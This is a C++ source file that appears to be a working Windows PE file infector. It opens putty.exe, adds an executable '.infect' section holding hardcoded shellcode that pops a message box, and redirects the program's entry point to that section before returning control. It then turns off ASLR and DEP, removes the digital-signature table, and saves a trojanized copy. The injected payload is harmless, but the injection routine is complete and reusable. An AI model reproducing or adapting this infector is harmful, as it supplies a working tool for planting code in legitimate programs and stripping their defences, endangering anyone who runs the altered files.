// PEfile_infection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <filesystem>
#include <iomanip>
#include "PE.h"

using namespace std;
constexpr std::size_t
align_up(std::size_t value, std::size_t alignment) noexcept {
    return (value + alignment - 1) & ~(alignment - 1);
}

int main(int argc, char* argv[])
{
    //char fileToInfect[] = "C:\\Windows\\System32\\mspaint.exe";
    char fileToInfect[] = "putty.exe";
    char new_name[] = "putty_aleix.exe";

    // Code to inject
    char xcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
    int xcode_size = sizeof xcode;
    
    // Open the binary to inject the code. 32 bits please.
    tuple<bool, char*, fstream::pos_type>  binary = PE::OpenBinary(fileToInfect);

    if (!get<0>(binary))
    {
        cout << "Error opening file";
        return 1;
    }

    char* PE_bytes = get<1>(binary);
    size_t PE_size = get<2>(binary);
    PE::PE_FILE PE_file = PE::ParsePE(PE_bytes);
    cout << "PE file parsed" << endl;

    // -------- Add the redirect code to the original header in the injection code ---------

    auto imagebase = PE_file.inh32.OptionalHeader.ImageBase;
    auto AOEP = PE_file.inh32.OptionalHeader.AddressOfEntryPoint;
    auto image_base_AOEP = imagebase + AOEP;

    cout << "Image base: " << std::hex << imagebase << endl;
    cout << "Address of entry point: " << std::hex << AOEP << endl;
    cout << "Absolute AOEP: " << std::hex << image_base_AOEP << endl;

    char push[] = "\x68"; // push
    char esp[] = "\xff\x24\x24"; // jmp [esp]

    // Address of entry poit absolute in little endian
    char hex_oep[] = { image_base_AOEP >> 0 & 0xFF, image_base_AOEP >> 8 & 0xFF, image_base_AOEP >> 16 & 0xFF, image_base_AOEP >> 24 & 0xFF }; // OEP

    auto injected_size = sizeof push + sizeof esp + sizeof hex_oep + xcode_size - 4;

    // ------------- Construction of new section -----------------

    // Increment the number of sections because we will add another one
    PE_file.inh32.FileHeader.NumberOfSections++;
    // index of the new section
    auto new_section = PE_file.inh32.FileHeader.NumberOfSections - 1;
    // Vector of section headers, one header extra for the new section
    vector<IMAGE_SECTION_HEADER> new_ish(PE_file.inh32.FileHeader.NumberOfSections + 1);

    // Copy the current Image Section Headers to the new ISH (vector of headers)
    for (size_t i = 0; i < PE_file.inh32.FileHeader.NumberOfSections - 1; ++i)
    {
        new_ish[i] = PE_file.ish[i];
    }

    // Overwrite the original ISH
    PE_file.ish = new_ish;

    // Construct the new Section Header

    // Section virtual address: VA of previous section plus previous section size + alignment
    PE_file.ish[new_section].VirtualAddress = PE_file.ish[new_section - 1].VirtualAddress + 
        align_up((PE_file.ish[new_section - 1].Misc.VirtualSize ? PE_file.ish[new_section - 1].Misc.VirtualSize : PE_file.ish[new_section - 1].SizeOfRawData), 
            PE_file.inh32.OptionalHeader.SectionAlignment);
    // Name of the new section (8 bytes size)
    memcpy(PE_file.ish[new_section].Name, ".infect", 8);

    // Point to Raw Data: P2RD of previous section plus last section size of raw data.
    PE_file.ish[new_section].PointerToRawData = PE_file.ish[new_section - 1].PointerToRawData 
        + PE_file.ish[new_section - 1].SizeOfRawData;

    // Current Virtual Size
    PE_file.ish[new_section].Misc.VirtualSize = injected_size;

    // Current Size of Raw Data
    PE_file.ish[new_section].SizeOfRawData = align_up(injected_size, PE_file.inh32.OptionalHeader.FileAlignment);

    // Characteristics of the new section
    PE_file.ish[new_section].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    // New Size of the image: last VA plus size of last section aligned (VS or RawD, what it's bigger)
    PE_file.inh32.OptionalHeader.SizeOfImage = PE_file.ish[new_section].VirtualAddress 
        + align_up((PE_file.ish[new_section].Misc.VirtualSize) ? PE_file.ish[new_section].Misc.VirtualSize : PE_file.ish[new_section].SizeOfRawData,
            PE_file.inh32.OptionalHeader.SectionAlignment);

    // New Address of entry point of the PE to our new section
    auto new_AEP = PE_file.ish[new_section].VirtualAddress;
    PE_file.inh32.OptionalHeader.AddressOfEntryPoint = new_AEP;

    // Inject the code
    auto size_of_code_section = PE_file.ish[new_section].SizeOfRawData;
    shared_ptr<char> n_section(new char[size_of_code_section] {}, std::default_delete<char[]>());

    auto inj_section = n_section.get();
    memcpy(inj_section, xcode, xcode_size - 1);
    memcpy(inj_section + xcode_size - 1, push, sizeof push);
    memcpy(inj_section + xcode_size + sizeof push - 2, hex_oep, sizeof hex_oep);
    memcpy(inj_section + sizeof hex_oep + sizeof push + xcode_size - 2, esp, sizeof esp);

    PE_file.Sections.push_back(n_section);

    // disable ASLR
    PE_file.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    PE_file.inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
    PE_file.inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
    PE_file.inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

    // disable DEP
    PE_file.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    // Posar a 0 la taula de certificats per a que no hi hagi signatura digital
    PE_file.inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
    PE_file.inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

    auto size_of_changed_pe = PE_size + size_of_code_section;

    WriteBinary(PE_file, new_name, size_of_changed_pe);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
